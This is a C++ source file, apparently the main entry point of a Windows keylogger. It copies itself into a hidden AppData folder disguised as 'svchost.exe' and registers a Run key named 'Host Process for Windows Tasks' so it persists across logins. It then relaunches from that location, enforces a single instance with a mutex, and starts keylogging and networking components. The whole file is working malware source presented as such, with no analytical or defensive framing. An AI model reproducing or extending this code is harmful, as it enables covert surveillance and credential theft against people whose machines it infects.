#include "networking.hpp"
#include "config.hpp"
#include "keylogger.hpp"

#include <iostream>
#include <string>
#include <windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include <tchar.h>

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
#if STARTUP == 1
	wchar_t currentPath[MAX_PATH];
	GetModuleFileName(NULL, currentPath, MAX_PATH);
	std::wstring currentPathWString(currentPath);

	TCHAR appdataPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
	PathAppend(appdataPath, _T("\\svchost"));
	std::wstring appdataPathWString(appdataPath);

	if (currentPathWString.find(appdataPathWString) == std::string::npos) {
		CreateDirectory(appdataPath, NULL);
		SetFileAttributes(appdataPath, FILE_ATTRIBUTE_HIDDEN);
		PathAppend(appdataPath, _T("\\svchost.exe"));
		CopyFileW(currentPath, appdataPath, FALSE);

		HKEY regKey = NULL;
		RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &regKey);
		RegSetValueEx(regKey, L"Host Process for Windows Tasks", 0, REG_SZ, (BYTE *)appdataPath, (wcslen(appdataPath) + 1) * 2);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		CreateProcess(appdataPath, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		exit(0);
	}
#endif

	CreateMutexA(0, FALSE, MUTEX);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return 1;

	Keylogger keylogger = Keylogger::getInstance();
	Networking networking = Networking::getInstance();

	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}
